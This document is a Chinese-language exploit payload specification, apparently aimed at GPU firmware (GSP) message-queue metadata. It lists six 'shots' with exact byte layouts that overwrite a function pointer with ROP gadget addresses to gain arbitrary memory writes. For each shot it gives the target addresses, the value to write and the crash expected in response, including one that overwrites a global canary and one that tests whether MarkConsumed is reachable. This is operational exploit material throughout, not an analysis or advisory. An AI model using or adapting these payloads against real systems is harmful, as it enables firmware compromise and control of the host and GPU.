# 下一枪载荷规格(元素32 = msgqMetadata;元素内偏移 = meta 偏移)
# 通用: K=33; 元素0头同前; 元素1..31 全零; 元素32 除下表外全零。
# 地址均为小端 8/4 字节。0x20000+off 为宿主缓冲内元素32的偏移。

## P1【最高】任意目的地址写 —— 证明"目的地址来自字段内容" (ck=0)
| meta偏移 | 值(hex 小端) | 含义 |
|---|---|---|
| 0xa4 | 01 | rxLinked=1 (rxrefresh 必须) |
| 0xb8 | 46 22 b5 01 00 00 00 00 | gadget 0x1b52246 = c.sw a4,0(a1); c.li a0,0; c.jr ra |
| 0x38 | 00 00 ad de 00 00 00 00 | a1 = DST = 0xdead0000 (由我们字段内容决定) |
| 0xc0 | 44 33 22 11 00 00 00 00 | a4 = VAL = 0x11223344 |
其余(a0/rxAvail 等)=0。预测: sepc=0x1b52246, scause=0xf(store page fault), stval=0xdead0000,
a1=0xdead0000, a4=0x11223344, a5=0x1b52246, PC trace 含 0x1004c9c->0x1b52246。
=> 目的地完全由 meta+0x38 内容决定 = 任意写达成。

## P2 1字节精确写 (ck=0), 可选
0xb8 = f6 b1 b6 01 ...(0x1b6b1f6 = sb a4,0(a1); ...); 0x38=DST; 0xc0=VAL(低8位)。

## P3 已映射目标落地检验 (ck=0)
同 P1, 仅 0x38 = 68 ff 18 04 00 00 00 00 (0x418ff68 全局canary), 0xc0 = 41 00 00 00...
预测: gadget 处不 fault; 之后 if TX-post/lookup 触发 canary 校验 -> 新崩溃 PC(栈溢出钩, ~0x1b5b68/0x1b4da14)。
若全程无新崩溃只有 Timeout => 也被视为"写入落地但未观测"(需 P4 对照)。

## P4 MarkConsumed 可达性判定 (ck=1, seq=期望值;重点)
目的: 证伪/证实"MarkConsumed 不可达"这个前提。
- 0xa4=01, 0xa0(rxAvail)=21 00 00 00 (非0 -> 不让流程先走 rxrefresh 分支)
- 0xb8 = e8 60 74 01 ...(0x17460e8 = c.sw a4,0(a0); ...), 0x40 = DST, 0xc0 = VAL
- staging(元素0..31): buffer[0]=magic(lo nibble 1), buffer[4]|= ((0x1de)<<8), buffer[0xc]=期望seq(1),
  buffer[0x10]=小值使 s2=1, buffer[0x18]=小值过硬 msgLen 门限, 整个拷贝区 XOR 折叠=0(checksum)。
预测: 若 MarkConsumed(0x10162c4/0x10163fc)被调用 -> a0=*(meta+0x40)=DST -> 在 0x17460e8 处 fault,
sepc=0x17460e8, stval=DST。若全程只在 rxrefresh 被调 -> 不崩/超时(仅写 meta+0x8c)。
=> 出现 DST fault 即证明 MarkConsumed 可达(且 a0=字段内容), 这是比 P1 更直接的任意写。

## P5 fcnBackendRw -> 原 helper 0x100cf9c 通道 (ck=0)
0xb8 = 9c cf 00 01 00 00 00 00 (0x100cf9c); 0xc0 = 20 16 19 04 ...(真 queueinfo 0x4191620);
0x38 = 窗口内偏移(需 q[0x78] <= off < q[0x78]+min(q[8],q[0x18])); 0xa4=01。
dir=0(a3=0): helper 把宿主窗口页内4字节拷到 meta+0x8c(writePtr)。
预测: 无崩溃(偏移合法)且 meta+0x8c 变为宿主缓冲对应字节 -> 之后 rxAvail 重算被宿主影响;
偏移非法则安全返回 0x40/0x1e, 无副作用。此枪同时检验 t2=0x15129b000 与页表 q[0x80] 假设(C级)。

## P6 静默持久化对照 (ck=0, 最便宜)
0x88=msgCount=64, 0x8c=0x9c=0xa0=0, 0xa4=01, 0xb8=ba dc 00 01 ...(0x100dcba = li a0,0; ret)。
预测: 无任何 GSP 崩溃, 宿主 Timeout; meta 保持腐化。
